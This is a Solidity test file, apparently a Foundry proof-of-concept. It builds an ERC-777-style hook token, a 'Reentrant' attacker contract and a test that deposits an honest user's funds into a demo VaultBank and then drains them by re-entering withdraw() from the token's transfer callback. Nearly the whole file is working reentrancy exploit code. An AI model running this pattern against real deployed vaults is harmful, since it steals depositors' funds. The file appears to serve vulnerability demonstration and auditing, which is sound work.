// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {ImpactProof} from "../src/ImpactProof.sol";
import {VaultBank} from "../../demo-target/VaultBank.sol";

/** ERC-777-style token: notifies the recipient on transfer. */
contract HookToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        require(balanceOf[f] >= a && allowance[f][msg.sender] >= a, "no");
        allowance[f][msg.sender] -= a; balanceOf[f] -= a; balanceOf[t] += a; return true;
    }
    function transfer(address t, uint256 a) external returns (bool) {
        require(balanceOf[msg.sender] >= a, "bal");
        balanceOf[msg.sender] -= a; balanceOf[t] += a;
        if (t.code.length > 0) { (bool ok,) = t.call(abi.encodeWithSignature("tokensReceived()")); ok; }
        return true;
    }
}

/** The attacker: re-enters withdraw() before VaultBank zeroes the balance. */
contract Reentrant {
    VaultBank public bank; HookToken public tok;
    uint256 public rounds;
    constructor(VaultBank b, HookToken t) { bank = b; tok = t; }
    function go(uint256 amount) external {
        tok.approve(address(bank), type(uint256).max);
        bank.deposit(amount);
        rounds = 4;
        bank.withdraw(amount);
    }
    function tokensReceived() external {
        if (rounds > 0 && address(bank).code.length > 0) {
            rounds--;
            try bank.withdraw(100e6) {} catch {}
        }
    }
    function sweepTo(address to) external { tok.transfer(to, tok.balanceOf(address(this))); }
}

contract VaultBankTheft is ImpactProof {
    VaultBank bank; HookToken tok; Reentrant atk;
    address depositor = address(0xD1);

    function setUp() public {
        tok  = new HookToken();
        bank = new VaultBank(address(tok));
        atk  = new Reentrant(bank, tok);

        // An honest user's money sits in the vault.
        tok.mint(depositor, 1_000e6);
        vm.startPrank(depositor);
        tok.approve(address(bank), type(uint256).max);
        bank.deposit(1_000e6);
        vm.stopPrank();

        tok.mint(address(atk), 100e6);
    }

    function target()   public view override returns (address) { return address(bank); }
    function asset()    public view override returns (address) { return address(tok); }
    function victim()   public view override returns (address) { return depositor; }
    function attacker() public view override returns (address) { return address(atk); }

    function exploit() public override { atk.go(100e6); }

    function withdraw(address who) public override {
        uint256 b = bank.balance(who);
        vm.prank(who);
        bank.withdraw(b);
    }
}
